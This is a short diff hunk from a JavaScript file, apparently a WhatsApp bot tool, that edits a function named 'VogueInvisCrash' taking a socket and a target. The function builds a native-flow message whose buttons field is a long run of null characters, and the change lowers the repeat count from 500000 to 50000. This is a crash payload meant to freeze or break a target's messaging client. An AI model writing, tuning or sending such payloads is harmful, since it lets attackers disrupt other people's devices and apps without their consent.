@@ -5989,7 +5989,7 @@ async function VogueInvisCrash(sock, target) {
             text: "\0"
           },
           nativeFlowMessage: {
-            buttons: "\0".repeat(500000)
+            buttons: "\0".repeat(50000)
           }
         }
       }
